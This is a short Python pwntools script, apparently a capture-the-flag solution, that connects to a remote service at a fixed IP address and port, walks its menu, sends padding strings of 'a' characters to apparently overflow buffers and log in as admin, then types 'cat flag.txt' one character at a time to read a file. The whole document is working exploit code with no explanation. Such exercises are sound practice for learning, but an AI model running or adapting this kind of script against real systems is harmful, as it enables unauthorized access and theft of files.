from pwn import *

r = remote("140.113.207.245", 30172)
print(r.recvuntil(b"> ").decode())
r.sendline("2".encode())
print(r.recvuntil(b"> ").decode())

payload = "a" * 28
r.sendline(payload.encode())
print(r.recvuntil(b"> ").decode())

r.sendline("a".encode())
print(r.recvuntil(b"> ").decode())

r.sendline("1".encode())
print(r.recvuntil(b"> ").decode())
r.sendline("admin".encode())
print(r.recvuntil(b"> ").decode())
payload = "a" * 12
r.sendline(payload.encode())
print(r.recvuntil(b"> ").decode())

r.sendline("3".encode())
print(r.recvuntil(b"> ").decode())
r.send(b"c")
r.send(b"a")
r.send(b"t")
r.send(b" ")
r.send(b"f")
r.send(b"l")
r.send(b"a")
r.send(b"g")
r.send(b".")
r.send(b"t")
r.send(b"x")
r.sendline(b"t")

print(r.recv().decode())

r.close()
